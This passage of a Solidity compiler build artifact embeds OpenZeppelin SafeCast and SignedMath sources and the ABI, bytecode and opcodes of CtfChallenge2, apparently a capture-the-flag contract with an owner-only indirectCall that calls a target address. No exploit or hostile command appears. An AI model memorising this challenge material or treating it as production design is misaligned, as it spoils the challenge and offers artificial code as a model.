(int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SignedMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SignedMath.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard signed math utilities missing in the Solidity language.\\n */\\nlibrary SignedMath {\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, int256 a, int256 b) internal pure returns (int256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * int256(SafeCast.toUint(condition)));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // Formula from the \\\"Bit Twiddling Hacks\\\" by Sean Eron Anderson.\\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\\n            // taking advantage of the most significant (or \\\"sign\\\" bit) in two's complement representation.\\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\\n            int256 mask = n >> 255;\\n\\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\\n            return uint256((n + mask) ^ mask);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xb1970fac7b64e6c09611e6691791e848d5e3fe410fa5899e7df2e0afd77a99e3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/CtfChallenge2.sol":{"CtfChallenge2":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"indirectCall","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"errors":{"OwnableInvalidOwner(address)":[{"details":"The owner is not a valid owner account. (eg. `address(0)`)"}],"OwnableUnauthorizedAccount(address)":[{"details":"The caller account is not authorized to perform an operation."}]},"kind":"dev","methods":{"owner()":{"details":"Returns the address of the current owner."},"renounceOwnership()":{"details":"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."},"transferOwnership(address)":{"details":"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_50":{"entryPoint":null,"id":50,"parameterSlots":1,"returnSlots":0},"@_5609":{"entryPoint":null,"id":5609,"parameterSlots":0,"returnSlots":0},"@_transferOwnership_146":{"entryPoint":153,"id":146,"parameterSlots":1,"returnSlots":0},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":399,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":414,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":381,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":349,"id":null,"parameterSlots":1,"returnSlots":1}},"generatedSources":[{"ast":{"nativeSrc":"0:590:14","nodeType":"YulBlock","src":"0:590:14","statements":[{"body":{"nativeSrc":"52:81:14","nodeType":"YulBlock","src":"52:81:14","statements":[{"nativeSrc":"62:65:14","nodeType":"YulAssignment","src":"62:65:14","value":{"arguments":[{"name":"value","nativeSrc":"77:5:14","nodeType":"YulIdentifier","src":"77:5:14"},{"kind":"number","nativeSrc":"84:42:14","nodeType":"YulLiteral","src":"84:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"73:3:14","nodeType":"YulIdentifier","src":"73:3:14"},"nativeSrc":"73:54:14","nodeType":"YulFunctionCall","src":"73:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"62:7:14","nodeType":"YulIdentifier","src":"62:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"7:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"34:5:14","nodeType":"YulTypedName","src":"34:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"44:7:14","nodeType":"YulTypedName","src":"44:7:14","type":""}],"src":"7:126:14"},{"body":{"nativeSrc":"184:51:14","nodeType":"YulBlock","src":"184:51:14","statements":[{"nativeSrc":"194:35:14","nodeType":"YulAssignment","src":"194:35:14","value":{"arguments":[{"name":"value","nativeSrc":"223:5:14","nodeType":"YulIdentifier","src":"223:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"205:17:14","nodeType":"YulIdentifier","src":"205:17:14"},"nativeSrc":"205:24:14","nodeType":"YulFunctionCall","src":"205:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"194:7:14","nodeType":"YulIdentifier","src":"194:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"139:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"166:5:14","nodeType":"YulTypedName","src":"166:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"176:7:14","nodeType":"YulTypedName","src":"176:7:14","type":""}],"src":"139:96:14"},{"body":{"nativeSrc":"306:53:14","nodeType":"YulBlock","src":"306:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"323:3:14","nodeType":"YulIdentifier","src":"323:3:14"},{"arguments":[{"name":"value","nativeSrc":"346:5:14","nodeType":"YulIdentifier","src":"346:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"328:17:14","nodeType":"YulIdentifier","src":"328:17:14"},"nativeSrc":"328:24:14","nodeType":"YulFunctionCall","src":"328:24:14"}],"functionName":{"name":"mstore","nativeSrc":"316:6:14","nodeType":"YulIdentifier","src":"316:6:14"},"nativeSrc":"316:37:14","nodeType":"YulFunctionCall","src":"316:37:14"},"nativeSrc":"316:37:14","nodeType":"YulExpressionStatement","src":"316:37:14"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"241:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"294:5:14","nodeType":"YulTypedName","src":"294:5:14","type":""},{"name":"pos","nativeSrc":"301:3:14","nodeType":"YulTypedName","src":"301:3:14","type":""}],"src":"241:118:14"},{"body":{"nativeSrc":"463:124:14","nodeType":"YulBlock","src":"463:124:14","statements":[{"nativeSrc":"473:26:14","nodeType":"YulAssignment","src":"473:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"485:9:14","nodeType":"YulIdentifier","src":"485:9:14"},{"kind":"number","nativeSrc":"496:2:14","nodeType":"YulLiteral","src":"496:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"481:3:14","nodeType":"YulIdentifier","src":"481:3:14"},"nativeSrc":"481:18:14","nodeType":"YulFunctionCall","src":"481:18:14"},"variableNames":[{"name":"tail","nativeSrc":"473:4:14","nodeType":"YulIdentifier","src":"473:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"553:6:14","nodeType":"YulIdentifier","src":"553:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"566:9:14","nodeType":"YulIdentifier","src":"566:9:14"},{"kind":"number","nativeSrc":"577:1:14","nodeType":"YulLiteral","src":"577:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"562:3:14","nodeType":"YulIdentifier","src":"562:3:14"},"nativeSrc":"562:17:14","nodeType":"YulFunctionCall","src":"562:17:14"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"509:43:14","nodeType":"YulIdentifier","src":"509:43:14"},"nativeSrc":"509:71:14","nodeType":"YulFunctionCall","src":"509:71:14"},"nativeSrc":"509:71:14","nodeType":"YulExpressionStatement","src":"509:71:14"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"365:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"435:9:14","nodeType":"YulTypedName","src":"435:9:14","type":""},{"name":"value0","nativeSrc":"447:6:14","nodeType":"YulTypedName","src":"447:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"458:4:14","nodeType":"YulTypedName","src":"458:4:14","type":""}],"src":"365:222:14"}]},"contents":"{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"608060405234801561001057600080fd5b5033600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036100845760006040517f1e4fbdf700000000000000000000000000000000000000000000000000000000815260040161007b919061019e565b60405180910390fd5b6100938161009960201b60201c565b506101b9565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101888261015d565b9050919050565b6101988161017d565b82525050565b60006020820190506101b3600083018461018f565b92915050565b610422806101c86000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80636ee6199f14610051578063715018a61461006d5780638da5cb5b14610077578063f2fde38b14610095575b600080fd5b61006b60048036038101906100669190610395565b6100b1565b005b61007561011c565b005b61007f610130565b60405161008c91906103d1565b60405180910390f35b6100af60048036038101906100aa9190610395565b610159565b005b6100b96101df565b8073ffffffffffffffffffffffffffffffffffffffff166382cb05c66040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b5050505050565b6101246101df565b61012e6000610266565b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6101616101df565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036101d35760006040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016101ca91906103d1565b60405180910390fd5b6101dc81610266565b50565b6101e761032a565b73ffffffffffffffffffffffffffffffffffffffff16610205610130565b73ffffffffffffffffffffffffffffffffffffffff16146102645761022861032a565b6040517f118cdaa700000000000000000000000000000000000000000000000000000000815260040161025b91906103d1565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600033905090565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061036282610337565b9050919050565b61037281610357565b811461037d57600080fd5b50565b60008135905061038f81610369565b92915050565b6000602082840312156103ab576103aa610332565b5b60006103b984828501610380565b91505092915050565b6103cb81610357565b82525050565b60006020820190506103e660008301846103c2565b9291505056fea2646970667358221220f5348b753442be450129087b7a707bd74a3137133c2f61b87958c83332df846b64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x84 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7B SWAP2 SWAP1 PUSH2 0x19E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x93 DUP2 PUSH2 0x99 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH2 0x1B9 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x188 DUP3 PUSH2 0x15D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x198 DUP2 PUSH2 0x17D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B3 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x18F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x422 DUP1 PUSH2 0x1C8 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6EE6199F EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x77 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x95 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH2 0xB1 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x75 PUSH2 0x11C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7F PUSH2 0x130 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8C SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAF PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xAA SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH2 0x159 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB9 PUSH2 0x1DF JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x82CB05C6 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x115 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH2 0x124 PUSH2 0x1DF JUMP JUMPDEST PUSH2 0x12E PUSH1 0x0 PUSH2 0x266 JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x161 PUSH2 0x1DF JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1D3 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1CA SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1DC DUP2 PUSH2 0x266 JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x1E7 PUSH2 0x32A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x205 PUSH2 0x130 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x264 JUMPI PUSH2 0x228 PUSH2 0x32A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x25B SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x362 DUP3 PUSH2 0x337 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x372 DUP2 PUSH2 0x357 JUMP JUMPDEST DUP2 EQ PUSH2 0x37D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x38F DUP2 PUSH2 0x369 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3AB JUMPI PUSH2 0x3AA PUSH2 0x332 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3B9 DUP5 DUP3 DUP6 ADD PUSH2 0x380 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3CB DUP2 PUSH2 0x357 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3E6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 CALLVALUE DUP12 PUSH22 0x3442BE450129087B7A707BD74A3137133C2F61B87958 0xC8 CALLER ORIGIN 0xDF DUP5 PUSH12 0x64736F6C634300081C003300 ","sourceMap":"209:174:9:-:0;;;247:36;;;;;;;;;;269:10;1297:1:0;1273:26;;:12;:26;;;1269:95;;1350:1;1322:31;;;;;;;;;;;:::i;:::-;;;;;;;;1269:95;1373:32;1392:12;1373:18;;;:32;;:::i;:::-;1225:187;209:174:9;;2912:187:0;2985:16;3004:6;;;;;;;;;;;2985:25;;3029:8;3020:6;;:17;;;;;;;;;;;;;;;;;;3083:8;3052:40;;3073:8;3052:40;;;;;;;;;;;;2975:124;2912:187;:::o;7:126:14:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;209:174:9:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@_checkOwner_84":{"entryPoint":479,"id":84,"parameterSlots":0,"returnSlots":0},"@_msgSender_159":{"entryPoint":810,"id":159,"parameterSlots":0,"returnSlots":1},"@_transferOwnership_146":{"entryPoint":614,"id":146,"parameterSlots":1,"returnSlots":0},"@indirectCall_5623":{"entryPoint":177,"id":5623,"parameterSlots":1,"returnSlots":0},"@owner_67":{"entryPoint":304,"id":67,"parameterS